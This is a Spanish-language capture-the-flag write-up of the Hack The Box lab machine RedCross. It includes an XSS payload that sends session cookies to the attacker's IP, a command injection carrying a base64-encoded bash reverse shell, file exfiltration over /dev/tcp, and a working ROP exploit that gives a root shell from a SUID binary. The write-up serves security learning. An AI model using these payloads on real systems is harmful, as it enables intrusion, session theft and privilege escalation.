---
layout: single
title: RedCross - Hack The Box
excerpt: "Explotacion de binarios"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-forest/forest1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - binarios
  - ROP
  - Windows  
  - XSS
  - Command-Injection

---


# 10.10.10.113 - RedCross
![](/assets/images/htb-redcross/redcross1.png)
-----------------------

# Part 1: Enumeración del sistema

Puertos abiertos 22(ssh), 80(http), 443(https). Nmap dice que:
- Tanto el puerto 80 como el 443 redirigen a intra.redcross.htb

Por tanto tenemos dos nuevos hosts al /etc/hosts redcross.htb e intra.redcross.htb: 
```console
└─$ whatweb http://10.10.10.113
http://10.10.10.113 [301 Moved] Apache[2.4.25] -> https://intra.redcross.htb/
https://intra.redcross.htb/ [302 Found] Apache[2.4.25], Cookies[PHPSESSID], RedirectLocation[/?page=login]
https://intra.redcross.htb/?page=login [200 OK] Apache[2.4.25], Cookies[PHPSESSID], PasswordField[pass]
```
recross.htb tambíen nos lleva a intra.redcross.
![](/assets/images/htb-redcross/redcross2.PNG)

Loguarnos en el panel de login se tramita como:  
```/POST a intra.redcross.htb/pages/actions.php  Cookie: PHPSESSID=isf5g87laf3r3glg34arsoj354 user=admin&pass=admin&action=login.```  
Al poner creds que no valen dice "Wrong Data"  
Tambien ha un boton "go login" que hace un ```POST a /?page=login``` con la data "action=go+login"

Podriamos intentar fuzzing e inyecciones pero parece que los tiros no van por ahí porque abajo pone:  
*"Por favor contacta con nuestro equipo por este fromulario para obtener creds"*
Como van a ver nuestra petición se me ocurren un XSS.  
En el formulario de contacto pone abajo: "Web messaging system 0.3b"  
![](/assets/images/htb-redcross/redcross3.PNG)

----------------------------------
# Part 2: XSS Cookie hijacking

En searchsploit: 
```console
└─$ searchsploit Web messaging system
Online Discussion Forum Site 1.0 - XSS in Messaging System   | php/webapps/48897.txt
```
Basicamente dice que el campo del mensaje es vulnerable a un XSS con el payload clásico: ```<script> alert("XSS"); </script>```

Si probamos el payload en los tres campos dice "Oops, Alguien está intentando hacer algo sucio"  
Para evitar esto hay que probar campo a campo a ver si la sanitización no se aplica en todos lados.  
Ahí acabamos dando con que el campo "contact phone or email" no aplica dicha medida, así que será por donde se cuele.  

```js
var req1 = new XMLHttpRequest();
req1.open('GET', 'http://10.10.14.12/?cookie=' + document.cookie, false);
req1.send();
```
Este payload lo que hace esque la persona haga una peticón a tu ip de atacante con su cookie:  
```<script src="http://10.10.14.12/pwn.js"></script>```
```console
└─$ sudo python3 -m http.server 80
10.10.10.113 - - [19/Nov/2022 10:32:33] "GET /pwn.js HTTP/1.1" 200 -
10.10.10.113 - - [19/Nov/2022 10:32:33] "GET /?cookie=PHPSESSID=ta4sbdc0an5jkq215m8q5kq2e5;%20LANG=EN_US;%20SINCE=1668850355;%20LIMIT=10;%20DOMAIN=admin HTTP/1.1" 200 -
```
Al poner esto (PHPSESSID=ta4sbdc0an5jkq215m8q5kq2e5) de cookie dice que hay un error en mi sintaxis sql. 

```python3
#!/usr/bin/python3
import requests
import urllib3; urllib3.disable_warnings()

url1 = "https://intra.redcross.htb/?page=app"
cookie = {"PHPSESSID":"ta4sbdc0an5jkq215m8q5kq2e5"}
sess = requests.session()
req1 = sess.get(url1, cookies=cookie,verify=False)
print(req1.text)
```
Si queremos secuestrar la session entera hay que ponerlo todo:  
```
└─$ php --interactive
php > print(urldecode("cookie=PHPSESSID=ta4sbdc0an5jkq215m8q5kq2e5;%20LANG=EN_US;%20SINCE=    1668850355;%20LIMIT=10;%20DOMAIN=admin HTTP/1.1"));
cookie=PHPSESSID=ta4sbdc0an5jkq215m8q5kq2e5; LANG=EN_US; SINCE=1668850355; LIMIT=10; DOMAIN=admin 
```
Asi que lo mismo en el python pero añadiendo mas campos:  
```python
cookie = {"PHPSESSID":"ta4sbdc0an5jkq215m8q5kq2e5", "LANG":"EN_US", "SINCE":"1668850355", "LIMIT":"10", "DOMAIN":"admin"}
```
----------------------------------
# Part 3: Entrando en el panel de administración 

Haciendo la petición tenemos un mensaje: 
```
** Información sobre cuenta de invitado ** De admin(uid 1) para invitado (uid 5)
Tendras bajos privilegios mientras te tramitamos la petición de credenciales, nuestro sistema de mensajería 
todavía está en fase beta asi que reporta si hay algun error.

** Comportamientos extraños ** de admin para charles(uid 3)
¿Podrias mirar el panel de administración? Esque no se que pasa pero cuando miro los mensajes me salen todo
el rato alertas POP-UP. ¿Sera un virus?  (o sea el alert("XSS") 
   
** Parad de mirar los mensajes de intra ** de penelope(uid 2) para admin
Hola... mira deja de mirar los mensajes de intra que seguro que es por culpa de alguna vulnerabilidad en el sitio.

** Parad de mirar los mensajes de intra ** de admin para penelope
Lo siento, no puedo hacer eso, es la única manera de comunicarme con los compañeros, y estamos saturados. 
No parece tan malo, ¿Que es lo peor que podria pasar? Lo arreglaré en cuanto pueda
```
Con esta extensión del navegador puedes moverte por toda la página arrastrando las cookies (son diferentes pero porque la pifié dandole a 
cerrar sesion y tuve que secuestrarlas otra vez).  
![](/assets/images/htb-redcross/redcross4.PNG)

En la cookie hay un campo que ponía "DOMAIN":"admin", y en los mensajes hablan de un panel de asministración, por lo que debería existir un
admin.redcross.htb. Si ponemos este subdominio en **/etc/hosts** nos resuelve a esta página.  
![](/assets/images/htb-redcross/redcross5.PNG)
![](/assets/images/htb-redcross/redcross6.PNG)

La seccion **adduser** si le pongo "cucuxii" -> cucuxii : 4QSjFXtt, y hago un ssh con este usaurio nos da un shell muy limitada.  
Podemos acceder a muy pocos archivos, entre ellos **/home/public/src/iptctl.c** Un script en c, como no sabemos que hace nos lo copiamos en 
nuestro sistema.

En network acces hay una sección llamada "Allow IP Adress", que sirve para abrir el firewall. Pongo la mía (10.10.14.12)

Si volvemos a hacer un escaneo de puertos, vemos que están abiertos también los 21,1025(NFS),5432(postgresSQL):
Cuando le das a **allow an ip** hay una peticion a ```/POST admin.redcross.htb/pages/actions.php   data -> ip=10.10.14.12&action=Allow+IP```  

----------------------------------
# Part 4: Inyeccion de comandos al sistema

Si seguimos con el tema del firewall, podriamos intentar un SO command inyection (ya que probablmente esta ip se le pase al comando iptables o 
cualquier otro, al poner ";" se le concatenaría un segundo comando al sistema)
```python3
sess = requests.session()
url2 = "https://admin.redcross.htb/pages/actions.php"
data = {'ip':'10.10.14.12; ping -c 1 10.10.14.12', 'action':'deny'}
cookie = {"PHPSESSID":"p62nigpusguiejj25rfaf1sq04"}
req2 = sess.post(url2, cookies=cookie, data=data, verify=False)
print(req2.text)
```
```console
└─$ sudo tcpdump -i tun0 icmp -n  
└─$ python3 red.py | html2text 
DEBUG: All checks passed... Executing iptables Network access restricted to
10.10.14.12 PING 10.10.14.12 (10.10.14.12) 56(84) bytes of data. 64 bytes from
10.10.14.12: icmp_seq=1 ttl=63 time=38.7 ms --- 10.10.14.12 ping statistics --
- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/
mdev = 38.713/38.713/38.713/0.000 ms rtt min/avg/max/mdev = 38.713/38.713/
38.713/0.000 ms

└─$ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'" | base64 -w0
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDMgMD4mMScK 
# data = {'ip':'10.10.14.12; echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDMgMD4mMScK | base64 -d | bash', 'action':'deny'}

└─$ sudo nc -nlvp 443
www-data@redcross:/var/www/html/admin/pages$
```

----------------------------------
# Part 5: Dentro al sistema. Explotación de binarios

En esa misma ruta hay un users.txt con las creds: "$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw");"
Pero por ahora no valen para nada. Subimos nuestro [script de reconocimiento](https://github.com/CUCUxii/Pentesting-tools/blob/main/lin_info_xii.sh):
- usuarios: root, penelope (nosotros somos www-data)  
- SUIDS -> /opt/iptctl/iptctl  
- root ejecuta /root/bin/redcrxss.py  
- El sistema es Little endian 64 bits  

```console
www-data@redcross:/tmp$ /opt/iptctl/iptctl show 10.10.14.12
DEBUG: All checks passed... Executing iptables
ERR: Function not available!
www-data@redcross:/tmp$ file /opt/iptctl/iptctl
ELF 64-bit LSB executable, x86-64, version
```
Como es un binario tocaría traernoslo.
```console
└─$ sudo nc -nlvp 666 > iptctl
www-data@redcross:/tmp$ cat < /opt/iptctl/iptctl > /dev/tcp/10.10.14.12/666
```
Si le hacemos un md5sum a ambos binarios (el que hemos traido y el original) vemos que los hashes son iguales por lo que no ha sufrido cambios en 
el camino
Hay una funcion **isValidAction** donde le pasamos la action con el parámetro -i y lo mete en un buffer de 10 caracteres ¿Y si hay más?
```console
└─$ ./iptctl  -i
Entering interactive mode
Action(allow|restrict|show): allowwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww
IP address: 127.0.0.1
zsh: segmentation fault  ./iptctl -i
```
Error de segmentación, es decir buffer overflow. El problema lo causa fgets en la función de interactive ya que intenta meter algo en el buffer que 
es mas grande que él.

Vamos primero a mirar las protecciones del binario:  
```console
www-data@redcross:/tmp$ for i in $(seq 1 20); do ldd /opt/iptctl/iptctl | grep libc | awk 'NF{print $NF}'; done
# Da cada vez una distinta asi que hay aleatorizacion de las direcciones de memoria

└─$ gdb ./iptctl
gef➤  checksec 
# Está NX activado así que no podemos hacer un shellcode buffer overflow porque no ejecutara la pila
# En cambio PIE está desactivado por lo que podemos aprovechar funciones existentes como execvp y setuid
```
Luego a analizar su comportamiento a bajo nivel:  
```console
gef➤  pattern create 50
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
gef➤  r -i   # Correr en modo interactivo
Action(allow|restrict|show): allowaaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
-------------------------------------------------------
$rsp   : 0x007fffffffddf8  →  "aaaeaaaaaaafaaaaaaaga\n"
$rbp   : 0x6161616164616161 ("aaadaaaa"?)
-------------------------------------------------------
gef➤  pattern offset $rsp
[+] Found at offset 29 (little-endian search) likely
# Si rsp es "aaaeaaaaaaafaaaaaaaga" entre eso y allow esta "aaaaaaaabaaaaaaacaaaaaaadaaaa" (29 caracteres)

gef➤  x/-48wx  $rsp
0x7fffffffddd8:	0x61776f6c	0x61616161	0x2e373231	0x2e302e30 # Nosotros empezamos a escribir como que por aqui
0x7fffffffdde8:	0x63000031	0x61616161	0x64616161	0x61616161

gef➤  x/48wx  $rsp
0x7fffffffddf8:	0x65616161	0x61616161	0x66616161	0x61616161 # A partir de aqui entramos en la pila de la funcion actual
0x7fffffffde08:	0x67616161	0x00000a61	0x00000000	0x00000000
```
Al no haber PIE, las direcciones en la PLT de execvp y setuid están estáticas. Querriamos manipularlas para que salga:
**execvp("bash",0)** y **setuid(1)**
```console
└─$ objdump -D ./iptctl | grep -E "execvp|setuid"
400d13:	e8 48 fa ff ff       	call   400760 <execvp@plt>
400d00:	e8 7b fa ff ff       	call   400780 <setuid@plt>
```
¿Como le pasamos los argumentos a las funciones luego? Como estamos en 64 bits funciona tal que una función lee los argumentos guardados en 
registros en este orden de prioridad -> **rdi rsi rdx r8 y r9**. Esos registros primero hay que abrirlos y luego cargar valores dentro.
```console
└─$ ropper --search "pop rdi" -f ./iptctl  # Para el primer argumento "sh"
0x0000000000400de3: pop rdi; ret; 

└─$ ropper --search "pop rsi" -f ./iptctl # Para el segundo, aunque abra r15, podemos meter "caca" ahi que da igual
0x0000000000400de1: pop rsi; pop r15; ret;

gef➤  grep "sh"
0x40046e - 0x400470  →   "sh" 
```
He creado el exploit en la máquina vicima para evitar problemas y como corre con python (1) he usado las liberias más básicas como struct en vez
de tirar de pwntools. Siempre recomiendo utulizar las herrameintas por defecto y mas simples para poder trabajar en cualquier entorno.

```python
import struct

junk = b"allow" + b"A"*29
pop_rdi = struct.pack('<q',0x400de3)
setuid = struct.pack('<q', 0x400780)
sh = struct.pack('<q',0x40046e)
pop_rsi = struct.pack('<q',0x400de1)
null = struct.pack('<q',0x0)
execvp = struct.pack('<q',0x400760)

payload = junk + pop_rdi + null + setuid + pop_rdi + sh + pop_rsi + null + null + execvp + b"\n127.0.0.1\n"
print(payload)
```
Es decir 
1. Metemos la basura para llegar a donde la pila  
2. Abrimos rdi para meterle un valor nulo a setuid quedando como **setuid(0)** o sea que opere como root.
3. Abrimos rdi para meterle a execvp "sh" pero tambien hay que meterle un segundo argumento nulo, el tema esque pop rsi nos abre otro registro más (r15) así que otro null extra
4. Le metemos la ip junto con dos "\n" que equivalen a darle al boton ENTER.

```console
python /tmp/exploit.py > /tmp/text
www-data@redcross:/opt/iptctl$ (cat /tmp/text; cat) | ./iptctl -i
Entering interactive mode
whoami
root
```
----------------------------
# Extra: Script en c de iptctl

```c
// #include de  <stdio.h>, <stdlib.h>, <string.h>, <arpa/inet.h>, <unistd.h>
#define BUFFSIZE 360

int isValidIpAddress(char *ipAddress)
{ struct sockaddr_in sa; int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr)); return result != 0; }
// Si este comando sale bien esque la ip es válida

int isValidAction(char *action){
    int a=0; char value[10]; strncpy(value,action,9);
    if(strstr(value,"allow")) a=1;  // Si es restrict accion 2 y si es show la 3
	return a; }

void cmdAR(char **a, char *action, char *ip){
    a[0]="/sbin/iptables"; a[1]=action; a[2]="INPUT"; a[3]="-p"; a[4]="all"; a[5]="-s"; a[6]=ip; a[7]="-j"; a[8]="ACCEPT";
    return;}  // Ej "/sbin/iptables ALLOW -p all -s 10.10.14.12 -j ACCEPT"

void cmdShow(char **a){ a[0]="/sbin/iptables"; a[1]="-L"; a[2]="INPUT"; return;} // O sea "/sbin/iptables -L "

void interactive(char *ip, char *action, char *name){
    char inputAddress[16]; char inputAction[10]; // Buffers de varaibles accion e ip
    printf("Entering interactive mode\n"); printf("Action(allow|restrict|show): ");
    fgets(inputAction,BUFFSIZE,stdin); fflush(stdin);
    printf("IP address: "); fgets(inputAddress,BUFFSIZE,stdin); fflush(stdin); // Mete los datos que le damos en los buffers
    inputAddress[strlen(inputAddress)-1] = 0;
    if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){
        printf("Usage: %s allow|restrict|show IP\n", name); exit(0); }
    strcpy(ip, inputAddress); strcpy(action, inputAction); return;}

int main(int argc, char *argv[]){
    int isAction=0; int isIPAddr=0; pid_t child_pid;
    char inputAction[10]; char inputAddress[16]; char *args[10]; char buffer[200];
	//Definimos algunas variables y buffers de ciertos tamaños

	if(argc!=3 && argc!=2){
    	printf("Usage: %s allow|restrict|show IP_ADDR\n", argv[0]); exit(0);} 
		// Si no hay argumentos nos da el mensaje este y sale. 

	if(argc==2){
    	if(strstr(argv[1],"-i")) interactive(inputAddress, inputAction, argv[0]); 
		// Si hay dos argumentos y el primero es -i entramos en modo interactivo "./iptctl -i"

	else{ strcpy(inputAction, argv[1]); strcpy(inputAddress, argv[2]); }
		// Si hay mas de dos el primero es el modo y el segundo la ip ej "./iptctl allow 127.0.0.1"

	isAction=isValidAction(inputAction);
	isIPAddr=isValidIpAddress(inputAddress);
	if(!isAction || !isIPAddr){ printf("Usage: %s allow|restrict|show IP\n", argv[0]); exit(0); }

	puts("DEBUG: All checks passed... Executing iptables");
	if(isAction==1) cmdAR(args,"-A",inputAddress);
	if(isAction==2) cmdAR(args,"-D",inputAddress);
	if(isAction==3) cmdShow(args);

	child_pid=fork();
	if(child_pid==0){ setuid(0); execvp(args[0],args); exit(0);}
	else{
    	if(isAction==1) printf("Network access granted to %s\n",inputAddress);
    	if(isAction==2) printf("Network access restricted to %s\n",inputAddress);
    	if(isAction==3) puts("ERR: Function not available!\n");}
```

Disclaimer: He podido aprender a hacer esta máquina gracias a **s4vitar** e **ippsec**